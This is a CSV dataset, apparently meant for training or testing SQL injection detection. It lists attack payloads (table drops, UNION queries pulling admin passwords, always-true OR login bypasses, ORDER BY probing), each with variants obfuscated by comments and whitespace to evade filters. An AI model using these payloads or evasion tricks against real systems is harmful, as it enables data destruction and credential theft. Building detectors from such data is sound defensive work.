variant_id,original_payload,obfuscated_payload,technique,intensity,Label,obfuscation_level
WS_00084,'; DROP TABLE users--,'; D/**/ROP TABLE users--,inline_comment_random,medium,1,moderate
WS_00085,'; DROP TABLE users--,'; DR/* */OP TABLE users--,multiline_comment,medium,1,moderate
WS_00086,'; DROP TABLE users--,'; DR/*comment*/OP TABLE users--,multiline_comment,medium,1,moderate
WS_00087,'; DROP TABLE users--,'; DR/*evil*/OP TABLE users--,multiline_comment,medium,1,moderate
WS_00088,'; DROP TABLE users--,'; DROP TABLE users-- extra comment,dash_comment,low,1,simple
WS_00089,'; DROP TABLE users--,'; DROP TABLE users--# comment,hash_comment,low,1,simple
WS_00090,SELECT * FROM users WHERE id=1,SELECT   * FROM   users WHERE   id=1,excessive_spaces,low,1,simple
WS_00091,SELECT * FROM users WHERE id=1,SELECT      * FROM      users WHERE      id=1,excessive_spaces,medium,1,moderate
WS_00092,SELECT * FROM users WHERE id=1,SELECT           * FROM           users WHERE           id=1,excessive_spaces,high,1,aggressive
WS_00093,SELECT * FROM users WHERE id=1,SELECT\t*\tFROM\tusers\tWHERE\tid=1,tab_injection,low,1,simple
WS_00094,SELECT * FROM users WHERE id=1,SELECT\t\t\t*\t\t\tFROM\t\t\tusers\t\t\tWHERE\t\t\tid=1,tab_injection,medium,1,moderate
WS_00095,SELECT * FROM users WHERE id=1,SELECT\t\t\t\t\t*\t\t\t\t\tFROM\t\t\t\t\tusers\t\t\t\t\tWHERE\t\t\t\t\tid=1,tab_injection,high,1,aggressive
WS_00096,SELECT * FROM users WHERE id=1,"SEL
ECT * FROM users WHERE id=1",newline_split,low,1,simple
WS_00097,SELECT * FROM users WHERE id=1,"SEL

ECT * FROM users WHERE id=1",newline_split,medium,1,moderate
WS_00098,SELECT * FROM users WHERE id=1,"SEL


ECT * FROM users WHERE id=1",newline_split,high,1,aggressive
WS_00099,SELECT * FROM users WHERE id=1,"
SELECT * 	FROM users 
WHERE id=1",mixed_whitespace,medium,1,moderate
WS_00100,SELECT * FROM users WHERE id=1,SEL/**/ECT * FROM users WHERE id=1,inline_comment_middle,medium,1,moderate
WS_00101,SELECT * FROM users WHERE id=1,S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE id=1,inline_comment_after_each_char,high,1,aggressive
WS_00102,SELECT * FROM users WHERE id=1,SEL/**/ECT * FROM users WHERE id=1,inline_comment_random,medium,1,moderate
WS_00103,SELECT * FROM users WHERE id=1,SEL/* */ECT * FROM users WHERE id=1,multiline_comment,medium,1,moderate
WS_00104,SELECT * FROM users WHERE id=1,SEL/*comment*/ECT * FROM users WHERE id=1,multiline_comment,medium,1,moderate
WS_00105,SELECT * FROM users WHERE id=1,SEL/*evil*/ECT * FROM users WHERE id=1,multiline_comment,medium,1,moderate
WS_00106,SELECT * FROM users WHERE id=1,SELECT * FROM users WHERE id=1-- comment,dash_comment,low,1,simple
WS_00107,SELECT * FROM users WHERE id=1,SELECT * FROM users WHERE id=1# comment,hash_comment,low,1,simple
WS_00108,UNION SELECT password FROM admins,UNION   SELECT   password FROM   admins,excessive_spaces,low,1,simple
WS_00109,UNION SELECT password FROM admins,UNION      SELECT      password FROM      admins,excessive_spaces,medium,1,moderate
WS_00110,UNION SELECT password FROM admins,UNION           SELECT           password FROM           admins,excessive_spaces,high,1,aggressive
WS_00111,UNION SELECT password FROM admins,UNION\tSELECT\tpassword\tFROM\tadmins,tab_injection,low,1,simple
WS_00112,UNION SELECT password FROM admins,UNION\t\t\tSELECT\t\t\tpassword\t\t\tFROM\t\t\tadmins,tab_injection,medium,1,moderate
WS_00113,UNION SELECT password FROM admins,UNION\t\t\t\t\tSELECT\t\t\t\t\tpassword\t\t\t\t\tFROM\t\t\t\t\tadmins,tab_injection,high,1,aggressive
WS_00114,UNION SELECT password FROM admins,"UNION SEL
ECT password FROM admins",newline_split,low,1,simple
WS_00115,UNION SELECT password FROM admins,"UNION SEL

ECT password FROM admins",newline_split,medium,1,moderate
WS_00116,UNION SELECT password FROM admins,"UNION SEL


ECT password FROM admins",newline_split,high,1,aggressive
WS_00117,UNION SELECT password FROM admins,"	UNION  SELECT password 
FROM admins",mixed_whitespace,medium,1,moderate
WS_00118,UNION SELECT password FROM admins,UNION SEL/**/ECT password FROM admins,inline_comment_middle,medium,1,moderate
WS_00119,UNION SELECT password FROM admins,UNION S/**/E/**/L/**/E/**/C/**/T password FROM admins,inline_comment_after_each_char,high,1,aggressive
WS_00120,UNION SELECT password FROM admins,UNION SEL/**/ECT password FROM admins,inline_comment_random,medium,1,moderate
WS_00121,UNION SELECT password FROM admins,UNION SEL/* */ECT password FROM admins,multiline_comment,medium,1,moderate
WS_00122,UNION SELECT password FROM admins,UNION SEL/*comment*/ECT password FROM admins,multiline_comment,medium,1,moderate
WS_00123,UNION SELECT password FROM admins,UNION SEL/*evil*/ECT password FROM admins,multiline_comment,medium,1,moderate
WS_00124,UNION SELECT password FROM admins,UNION SELECT password FROM admins-- comment,dash_comment,low,1,simple
WS_00125,UNION SELECT password FROM admins,UNION SELECT password FROM admins# comment,hash_comment,low,1,simple
WS_00126,' OR 'a'='a,' OR   'a'='a,excessive_spaces,low,1,simple
WS_00127,' OR 'a'='a,' OR      'a'='a,excessive_spaces,medium,1,moderate
WS_00128,' OR 'a'='a,' OR           'a'='a,excessive_spaces,high,1,aggressive
WS_00129,' OR 'a'='a,'\tOR\t'a'='a,tab_injection,low,1,simple
WS_00130,' OR 'a'='a,'\t\t\tOR\t\t\t'a'='a,tab_injection,medium,1,moderate
WS_00131,' OR 'a'='a,'\t\t\t\t\tOR\t\t\t\t\t'a'='a,tab_injection,high,1,aggressive
WS_00132,' OR 'a'='a,"' O
R 'a'='a",newline_split,low,1,simple
WS_00133,' OR 'a'='a,"' O

R 'a'='a",newline_split,medium,1,moderate
WS_00134,' OR 'a'='a,"' O


R 'a'='a",newline_split,high,1,aggressive
WS_00135,' OR 'a'='a,'  OR 'a'='a,mixed_whitespace,medium,1,moderate
WS_00136,' OR 'a'='a,' O/**/R 'a'='a,inline_comment_middle,medium,1,moderate
WS_00137,' OR 'a'='a,' O/**/R 'a'='a,inline_comment_after_each_char,high,1,aggressive
WS_00138,' OR 'a'='a,' O/**/R 'a'='a,inline_comment_random,medium,1,moderate
WS_00139,' OR 'a'='a,' O/* */R 'a'='a,multiline_comment,medium,1,moderate
WS_00140,' OR 'a'='a,' O/*comment*/R 'a'='a,multiline_comment,medium,1,moderate
WS_00141,' OR 'a'='a,' O/*evil*/R 'a'='a,multiline_comment,medium,1,moderate
WS_00142,' OR 'a'='a,' OR 'a'='a-- comment,dash_comment,low,1,simple
WS_00143,' OR 'a'='a,' OR 'a'='a# comment,hash_comment,low,1,simple
WS_00144,1' ORDER BY 1--,1' ORDER   BY 1--,excessive_spaces,low,1,simple
WS_00145,1' ORDER BY 1--,1' ORDER      BY 1--,excessive_spaces,medium,1,moderate
WS_00146,1' ORDER BY 1--,1' ORDER           BY 1--,excessive_spaces,high,1,aggressive
WS_00147,1' ORDER BY 1--,1'\tORDER\tBY\t1--,tab_injection,low,1,simple
WS_00148,1' ORDER BY 1--,1'\t\t\tORDER\t\t\tBY\t\t\t1--,tab_injection,medium,1,moderate
WS_00149,1' ORDER BY 1--,1'\t\t\t\t\tORDER\t\t\t\t\tBY\t\t\t\t\t1--,tab_injection,high,1,aggressive
WS_00150,1' ORDER BY 1--,"1' OR
DER BY 1--",newline_split,low,1,simple
WS_00151,1' ORDER BY 1--,"1' OR

DER BY 1--",newline_split,medium,1,moderate
WS_00152,1' ORDER BY 1--,"1' OR


DER BY 1--",newline_split,high,1,aggressive
WS_00153,1' ORDER BY 1--,1' 	ORDER BY 1--,mixed_whitespace,medium,1,moderate
WS_00154,1' ORDER BY 1--,1' OR/**/DER BY 1--,inline_comment_middle,medium,1,moderate
WS_00155,1' ORDER BY 1--,1' O/**/R/**/D/**/E/**/R BY 1--,inline_comment_after_each_char,high,1,aggressive
WS_00156,1' ORDER BY 1--,1' ORDE/**/R BY 1--,inline_comment_random,medium,1,moderate
WS_00157,1' ORDER BY 1--,1' OR/* */DER BY 1--,multiline_comment,medium,1,moderate
WS_00158,1' ORDER BY 1--,1' OR/*comment*/DER BY 1--,multiline_comment,medium,1,moderate
WS_00159,1' ORDER BY 1--,1' OR/*evil*/DER BY 1--,multiline_comment,medium,1,moderate
WS_00160,1' ORDER BY 1--,1' ORDER BY 1-- extra comment,dash_comment,low,1,simple
WS_00161,1' ORDER BY 1--,1' ORDER BY 1--# comment,hash_comment,low,1,simple
